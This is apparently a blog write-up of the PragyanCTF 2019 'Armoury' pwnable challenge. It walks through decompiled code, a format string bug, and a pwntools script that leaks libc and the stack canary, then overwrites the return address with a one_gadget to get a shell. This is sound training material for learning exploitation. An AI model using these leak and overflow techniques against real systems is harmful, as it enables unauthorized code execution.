---
layout: post
cover: 'assets/images/cover8.jpg'
navigation: true
title: PragyanCTF2019 - Armoury
date: 2019-03-11
tags: pwnable writeup
subclass: 'post'
logo: 'assets/images/ghost.png'
author: lanphere
categories: lanphere
disqus: true
---

GitHub에도 Writeup을 같이 올리다보니 한글 영어 둘 다 써야해서 이제 그냥 영어로 써야겠다.

```
[*] '/mnt/hgfs/Shared/armoury'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

FULL RELRO, Canary, NX, PIE.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int v3; // eax
  signed int v5; // [rsp+Ch] [rbp-34h]
  char buffer_1[15]; // [rsp+11h] [rbp-2Fh]
  char buffer_2[24]; // [rsp+20h] [rbp-20h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  initialize();
  puts("*******Rifle Database**************");
  v5 = 2;
  while ( 1 )
  {
    v3 = v5--;
    if ( v3 <= 0 )
      break;
    puts("\nEnter the name of Rifle to get info:");
    __isoc99_scanf("%s", buffer_1);
    if ( !strcmp(buffer_1, "Exit") )
      break;
    puts("\n----------------DATA-------------------");
    printf(buffer_1, "Exit");
    giveInfo(buffer_1);
    puts("---------------------------------------");
  }
  puts("Would you like to give us some feedback:");
  __isoc99_scanf("%s", buffer_2);
  puts("Thank you");
  return 0;
}
```

Nothing special. Get user input and print it. Don't care about giveInfo(). The function simply searches user input in the list of rifles and print the description of the rifle.

This binary has format string vulnerability in `printf(buffer_1, "Exit");`

```
*******Rifle Database**************

Enter the name of Rifle to get info:
%p

----------------DATA-------------------
0x7fda78a847e3:
Sorry... We dont have any information about %p
---------------------------------------
```

We can get libc leak from the first %p of format string.

```
*******Rifle Database**************

Enter the name of Rifle to get info:
AAAA%p%p%p%p%p%p%p%p

----------------DATA-------------------
AAAA0x7f1e5d1657e30x7f1e5d1668c00x7f1e5d0962a40x7f1e5d16b5000xa0x10x1fe37dced0x25702541414141a0:
Sorry... We dont have any information about AAAA%p%p%p%p%p%p%p%p
```

and data in stack is revealed from 8th %p, canary from 13th %p. Since we know the canary value, we can directly overflow the stack and bypass canary check without destroying canary.

Scenario is,

1. Libc, canary leak from first procedure
2. buffer overflow, overwrite return address with one_gadget
3. recovery canary value at feedback input

```
from pwn import *

p = process('./armoury')
bin = ELF('./armoury')

one_gadget_offset = 0xe42ee # 0x4345e 0x434b2 0xe42ee

# gdb.attach(p, '')

# Format String, Libc leak
p.sendlineafter('get info:\n', '%p%13$p%17$p')
p.recvuntil('---\n')
result = p.recvuntil(':').split('0x')
log.info(result)
libc_addr = int(result[1], 16) - 0x1b87e3
canary = int(result[2], 16)
one_gadget_addr = libc_addr + one_gadget_offset
log.info('Libc Addr: ' + hex(libc_addr))
log.info('Canary Value: ' + hex(canary))
log.info('One_gadget Addr: ' + hex(one_gadget_addr))

# Overwrite return addr with one_gadget
payload = 'A' * 39 + p64(canary | 0xff) + 'BBBBBBBB'
payload += p64(one_gadget_addr)
p.sendlineafter('get info:\n', payload)
payload = 'A' * 24
p.sendlineafter('feedback:\n', payload)

p.interactive()
```